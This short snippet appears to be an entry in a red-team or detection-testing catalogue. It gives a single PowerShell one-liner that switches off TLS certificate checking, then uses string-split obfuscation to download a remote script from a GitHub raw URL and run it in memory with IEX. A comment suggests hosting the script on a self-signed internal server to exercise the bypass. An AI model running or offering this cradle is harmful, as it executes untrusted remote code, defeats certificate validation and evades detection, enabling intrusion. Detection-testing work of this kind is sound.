# Source ID #27 — TLS Validation Bypass + Cradle
# NOTE: GitHub already has a valid, trusted cert — this bypass technique
# won't actually be "tested" meaningfully against raw.githubusercontent.com,
# since there's no invalid cert to bypass. If you want a real test of this
# specific technique, host s.ps1 on your own server with a self-signed cert
# instead (http://10.10.10.50/s.ps1) and use that URL here.
powershell.exe -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; .('I'+'EX') (New-Object ('Net.'+'Web'+'Client')).('Download'+'String').Invoke('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/s.ps1')"
